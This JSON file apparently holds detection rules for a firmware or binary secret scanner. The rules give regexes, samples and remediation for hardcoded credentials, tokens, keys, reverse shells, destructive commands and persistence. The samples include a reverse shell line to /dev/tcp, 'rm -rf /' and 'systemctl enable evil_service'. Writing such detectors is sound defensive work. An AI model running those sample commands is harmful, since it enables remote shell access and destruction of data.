[
  {
    "id": "RULE-GENERIC-001",
    "category": "generic",
    "type": "credentials",
    "description": "Detects hardcoded usernames and passwords in plain-text",
    "regex": "admin[:=][^[:space:]]+|root[:=][^[:space:]]+|user=.*&pass=.*|password[:=][^[:space:]]+|passwd[:=][^[:space:]]+|pwd[:=][^[:space:]]+",
    "sample": "admin=1234",
    "tags": ["auth", "credentials", "plaintext"],
    "consequences": "Allows attacker access without authentication if credentials are exposed in binary.",
    "remediation": "Avoid hardcoding credentials; use secure credential stores or obfuscation with runtime injection.",
    "severity": "high",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-GENERIC-002",
    "category": "generic",
    "type": "tokens",
    "description": "Detects API tokens and JWTs hardcoded in binaries",
    "regex": "slack_token[^[:space:]]+|AKIA[0-9A-Z]{16}|eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9._-]+\\.[A-Za-z0-9_-]+|AIza[0-9A-Za-z\\-_]{35}",
    "sample": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
    "tags": ["auth", "tokens", "api"],
    "consequences": "Exposes authentication secrets, allowing API misuse, impersonation, or privilege escalation.",
    "remediation": "Remove embedded tokens and load securely at runtime using environment variables or secure APIs.",
    "severity": "high",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-GENERIC-003",
    "category": "generic",
    "type": "private_keys",
    "description": "Detects embedded private key blocks in the binary",
    "regex": "-----BEGIN (RSA|DSA|EC|OPENSSH|PGP|PRIVATE) KEY-----",
    "sample": "-----BEGIN RSA PRIVATE KEY-----",
    "tags": ["crypto", "secrets", "keys"],
    "consequences": "Compromise of private keys can lead to spoofing, impersonation, or data decryption.",
    "remediation": "Do not embed private keys in firmware. Use secure hardware or key management solutions.",
    "severity": "critical",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-GENERIC-004",
    "category": "generic",
    "type": "reverse_shells",
    "description": "Detects typical reverse shell payload patterns",
    "regex": "bash -i >& /dev/tcp/|/bin/bash -c \\\".*nc .* -e /bin/sh\\\"",
    "sample": "bash -i >& /dev/tcp/192.168.0.1/4444 0>&1",
    "tags": ["backdoor", "shell", "payload"],
    "consequences": "Can provide attacker full shell access if triggered at runtime.",
    "remediation": "Audit and sanitize all command execution paths. Remove embedded shell payloads.",
    "severity": "critical",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-GENERIC-005",
    "category": "generic",
    "type": "emails",
    "description": "Detects embedded hardcoded or internal email addresses",
    "regex": "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.(com|org|net|local)",
    "sample": "devops@internal.local",
    "tags": ["metadata", "leakage", "intel"],
    "consequences": "May expose internal contacts, engineering teams, or C2 infrastructure used by embedded devices.",
    "remediation": "Strip emails from compiled binaries or use redacted formats in debug data.",
    "severity": "low",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-GENERIC-006",
    "category": "generic",
    "type": "system_commands",
    "description": "Detects potentially dangerous system command invocations",
    "regex": "(?i)(rm -rf|mkfs|dd if=|mount|chmod 777|chown root|exec sh|eval .+)",
    "sample": "rm -rf /",
    "tags": ["execution", "commands", "risk"],
    "consequences": "Can indicate destructive or privilege-escalation behavior in firmware.",
    "remediation": "Remove risky system commands or limit with privilege restrictions and integrity checks.",
    "severity": "high",
    "confidence": "medium",
    "enabled": true
  },
  {
    "id": "RULE-GENERIC-007",
    "category": "generic",
    "type": "config_files",
    "description": "Detects references to sensitive configuration files",
    "regex": "(\\.env|config\\.yaml|config\\.json|settings\\.ini|application\\.properties|config\\.xml|docker-compose\\.yml)",
    "sample": "config.yaml",
    "tags": ["config", "secrets", "setup"],
    "consequences": "May leak database URIs, credentials, or sensitive runtime options.",
    "remediation": "Avoid embedding file paths. Use secure runtime configs or redacted values.",
    "severity": "medium",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-GENERIC-008",
    "category": "generic",
    "type": "iot_ids",
    "description": "Detects MAC addresses or UUIDs embedded in the binary",
    "regex": "([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})|uuid[:=][0-9a-fA-F-]{36}",
    "sample": "uuid=123e4567-e89b-12d3-a456-426655440000",
    "tags": ["iot", "device_id", "tracking"],
    "consequences": "May allow fingerprinting or tracking of devices.",
    "remediation": "Avoid hardcoding static device identifiers.",
    "severity": "low",
    "confidence": "medium",
    "enabled": true
  },
  {
    "id": "RULE-GENERIC-009",
    "category": "generic",
    "type": "internal_urls",
    "description": "Detects internal or non-production service endpoints",
    "regex": "(https?://)?(localhost|127\\.0\\.0\\.1|10\\.\\d+\\.\\d+\\.\\d+|192\\.168\\.\\d+\\.\\d+|dev\\.[a-z0-9.-]+|internal\\.[a-z0-9.-]+)|/debug\\.cgi",
    "sample": "http://127.0.0.1:8080/internal",
    "tags": ["leakage", "internal", "debug"],
    "consequences": "Internal interfaces exposed externally can lead to remote access or information leaks.",
    "remediation": "Use environment-based configuration. Strip debug and local service URLs from releases.",
    "severity": "medium",
    "confidence": "high",
    "enabled": true
  },
  {
    "id": "RULE-GENERIC-010",
    "category": "generic",
    "type": "persistent_backdoors",
    "description": "Detects persistence mechanisms like cron, systemd, or init.d scripts",
    "regex": "(?i)(cron|systemd|init\\.d|rc\\.local|at\\.d|crontab|systemctl enable)",
    "sample": "systemctl enable evil_service",
    "tags": ["backdoor", "persistence"],
    "consequences": "Enables malware to survive reboots and reinfect systems automatically.",
    "remediation": "Audit for unauthorized startup scripts. Lock boot-level persistence via secure boot or HSM.",
    "severity": "critical",
    "confidence": "high",
    "enabled": true
  }
]
